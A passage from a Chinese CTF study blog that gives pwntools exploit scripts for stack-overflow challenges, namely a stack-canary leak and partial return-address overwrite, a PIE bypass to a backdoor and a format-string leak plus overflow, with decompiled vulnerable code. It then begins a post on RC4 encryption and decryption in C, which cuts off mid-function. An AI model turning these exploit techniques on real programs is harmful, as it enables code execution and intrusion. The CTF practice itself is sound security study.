<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Step1 leak canary &amp; ret_addr</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;xxxxx&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">36</span>+<span class="string">b&quot;bbbb&quot;</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0x0a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak canary:&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Step2 overwrite</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:\n&quot;</span>)</span><br><span class="line"><span class="comment">#b&quot;\x3E\x8A&quot;是getshell的地址</span></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+<span class="string">b&quot;\x3E\x8A&quot;</span> <span class="comment"># luckly~</span></span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="覆盖返回地址的后两个字节转跳到后门函数"><a href="#覆盖返回地址的后两个字节转跳到后门函数" class="headerlink" title="覆盖返回地址的后两个字节转跳到后门函数"></a>覆盖返回地址的后两个字节转跳到后门函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_120E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A nice try to break pie!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x29u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先找到需要转跳的地址</p>
<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/6.png" alt="6"></p>
<p>这里是0x126c只要把返回地址后两字节覆盖成0x6c即可</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./pie_1&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&quot;A nice try to break pie!!!&quot;</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span> + p8(<span class="number">0x6c</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h5 id="这里再记录一个canary和pie结合的题目"><a href="#这里再记录一个canary和pie结合的题目" class="headerlink" title="这里再记录一个canary和pie结合的题目"></a>这里再记录一个canary和pie结合的题目</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  sub_1240();</span><br><span class="line">  sub_132F();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_132F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>);</span><br><span class="line">  gets(format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Nice to meet you, &quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(format, <span class="string">&quot;!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Anything else? &quot;</span>);</span><br><span class="line">  gets(v2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>canary用格式化字符串泄露，然后再利用栈溢出来getshell</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./find_flag&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28027</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;%17$paaaa%19$p&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输出</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">data = r.recvline().strip()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据</span></span><br><span class="line">leaked = data.split(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(leaked[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(leaked[<span class="number">1</span>][:-<span class="number">1</span>], <span class="number">16</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked address 17$p: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked address 19$p: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">back_door = ret_addr - <span class="number">0x146F</span> + <span class="number">0x122e</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&quot;Anything else? &quot;</span>, <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x40</span> - <span class="number">0x08</span>) + p64(canary) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p64(back_door))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>注释：19泄露的是返回地址，17泄露的是canary的地址</p>
<p>17怎么计算参考上面的格式化字符串泄露canary,canary和返回地址正好相差两个0x08。所以ret_addr的地址是19处。</p>
<p>0x146f和0x122e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013F9 ; __unwind &#123;</span><br><span class="line">.text:00000000000013F9                 endbr64</span><br><span class="line">.text:00000000000013FD                 push    rbp</span><br><span class="line">.text:00000000000013FE                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001401                 sub     rsp, 10h</span><br><span class="line">.text:0000000000001405                 mov     rax, cs:stdin</span><br><span class="line">.text:000000000000140C                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000001411                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000001416                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000000141B                 mov     rdi, rax        ; stream</span><br><span class="line">.text:000000000000141E                 call    _setvbuf</span><br><span class="line">.text:0000000000001423                 mov     rax, cs:stdout</span><br><span class="line">.text:000000000000142A                 mov     ecx, 0          ; n</span><br><span class="line">.text:000000000000142F                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000001434                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000001439                 mov     rdi, rax        ; stream</span><br><span class="line">.text:000000000000143C                 call    _setvbuf</span><br><span class="line">.text:0000000000001441                 call    _getegid</span><br><span class="line">.text:0000000000001446                 mov     [rbp+rgid], eax</span><br><span class="line">.text:0000000000001449                 mov     edx, [rbp+rgid] ; sgid</span><br><span class="line">.text:000000000000144C                 mov     ecx, [rbp+rgid]</span><br><span class="line">.text:000000000000144F                 mov     eax, [rbp+rgid]</span><br><span class="line">.text:0000000000001452                 mov     esi, ecx        ; egid</span><br><span class="line">.text:0000000000001454                 mov     edi, eax        ; rgid</span><br><span class="line">.text:0000000000001456                 call    _setresgid</span><br><span class="line">.text:000000000000145B                 mov     eax, 0</span><br><span class="line">.text:0000000000001460                 call    sub_1240</span><br><span class="line">.text:0000000000001465                 mov     eax, 0</span><br><span class="line">.text:000000000000146A                 call    sub_132F  //执行完这个函数就会执行 mov eax, 0，所以返回地址在0x146a这里</span><br><span class="line">.text:000000000000146F                 mov     eax, 0</span><br><span class="line">.text:0000000000001474                 leave</span><br><span class="line">.text:0000000000001475                 retn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001229 ; __unwind &#123;</span><br><span class="line">.text:0000000000001229                 endbr64</span><br><span class="line">.text:000000000000122D                 push    rbp</span><br><span class="line">.text:000000000000122E                 mov     rbp, rsp   //后门地址 0x122e,实际上0x1231也行。</span><br><span class="line">.text:0000000000001231                 lea     rdi, command    ; &quot;/bin/cat flag.txt&quot;</span><br><span class="line">.text:0000000000001238                 call    _system</span><br><span class="line">.text:000000000000123D                 nop</span><br><span class="line">.text:000000000000123E                 pop     rbp</span><br><span class="line">.text:000000000000123F                 retn</span><br></pre></td></tr></table></figure>



<h3 id="利用vsyscall地址不变"><a href="#利用vsyscall地址不变" class="headerlink" title="利用vsyscall地址不变"></a>利用vsyscall地址不变</h3><p>记录一下有这个方式，到时候了解了在写</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>canary-pie</category>
      </categories>
  </entry>
  <entry>
    <title>rc4学习</title>
    <url>/2025/07/27/rc4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>感觉打了这么就得逆向，没AI感觉就不中了，啥也干不了，于是从现在开始学习原理知识。</p>
<p>开始rc4的学习以后碰到rc4就放到这个里面来。开始全栈之逆向之路。</p>
<h3 id="标准rec4加密"><a href="#标准rec4加密" class="headerlink" title="标准rec4加密"></a>标准rec4加密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LEN 1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> i;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">&#125; RC4_CTX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// 使用 int 避免 size_t 转换警告</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (<span class="type">unsigned</span> <span class="type">char</span>)(j + ctx-&gt;S[i] + key[i % key_len]);  <span class="comment">// 显式转换</span></span><br><span class="line">        temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成密钥流字节 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX* ctx)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    ctx-&gt;i = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;i + <span class="number">1</span>);</span><br><span class="line">    ctx-&gt;j = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]);</span><br><span class="line">    temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) &amp; <span class="number">0xFF</span>];  <span class="comment">// 使用位操作避免转换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* input,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 二进制转十六进制 */</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">bin2hex</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* bin, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* hex = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hex) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        sprintf_s(hex + i * <span class="number">2</span>, <span class="number">3</span>, <span class="string">&quot;%02X&quot;</span>, bin[i]);  <span class="comment">// 使用安全的 sprintf_s</span></span><br><span class="line">    &#125;</span><br><span class="line">    hex[len * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 安全获取输入 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_input</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* prompt, <span class="type">char</span>* buffer, <span class="type">size_t</span> max_len)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="keyword">if</span> (fgets(buffer, (<span class="type">int</span>)max_len, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;  <span class="comment">// 显式转换</span></span><br><span class="line">        buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除换行符</span></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span> &amp;&amp; buffer[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        buffer[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[MAX_INPUT_LEN];</span><br><span class="line">    <span class="type">char</span> plaintext[MAX_INPUT_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== RC4 加密工具 ===\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    get_input(<span class="string">&quot;请输入密钥: &quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    get_input(<span class="string">&quot;请输入明文: &quot;</span>, plaintext, <span class="keyword">sizeof</span>(plaintext));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(plaintext);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;错误: 明文不能为空\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ciphertext = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">if</span> (!ciphertext) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密过程</span></span><br><span class="line">    RC4_CTX ctx;</span><br><span class="line">    rc4_init(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)plaintext, ciphertext, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为十六进制</span></span><br><span class="line">    <span class="type">char</span>* hex_cipher = bin2hex(ciphertext, len);</span><br><span class="line">    <span class="keyword">if</span> (!hex_cipher) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 十六进制转换失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(ciphertext);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密结果:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密钥: %s\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文: %s\n&quot;</span>, plaintext);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文(HEX): %s\n&quot;</span>, hex_cipher);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内存</span></span><br><span class="line">    <span class="built_in">free</span>(ciphertext);</span><br><span class="line">    <span class="built_in">free</span>(hex_cipher);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n按 Enter 键退出...&quot;</span>);</span><br><span class="line">    getchar();  <span class="comment">// 忽略返回值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="标准rec4解密"><a href="#标准rec4解密" class="headerlink" title="标准rec4解密"></a>标准rec4解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LEN 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> i;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">&#125; RC4_CTX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// 使用 int 避免 size_t 转换警告</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (<span class="type">unsigned</span> <span class="type">char</span>)(j + ctx-&gt;S[i] + key[i % key_len]);  <span class="comment">// 显式转换</span></span><br><span class="line">        temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成密钥流字节 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX* ctx)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    ctx-&gt;i = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;i + <span class="number">1</span>);</span><br><span class="line">    ctx-&gt;j = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]);</span><br><span class="line">    temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) &amp; <span class="number">0xFF</span>];  <span class="comment">// 使用位操作避免转换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* input,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 十六进制转二进制 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">hex2bin</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* hex, <span class="type">size_t</span>* len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> hex_len = <span class="built_in">strlen</span>(hex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查十六进制长度</span></span><br><span class="line">    <span class="keyword">if</span> (hex_len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制长度\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *len = hex_len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (*len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* bin = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(*len);</span><br><span class="line">    <span class="keyword">if</span> (!bin) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; *len; i++) &#123;</span><br><span class="line">        <span class="type">char</span> hex_byte[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        hex_byte[<span class="number">0</span>] = hex[i * <span class="number">2</span>];</span><br><span class="line">        hex_byte[<span class="number">1</span>] = hex[i * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* endptr;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> value = strtoul(hex_byte, &amp;endptr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*endptr != <span class="string">&#x27;\0&#x27;</span> || value &gt; <span class="number">255</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制字节 &#x27;%s&#x27;\n&quot;</span>, hex_byte);</span><br><span class="line">            <span class="built_in">free</span>(bin);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bin[i] = (<span class="type">unsigned</span> <span class="type">char</span>)value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 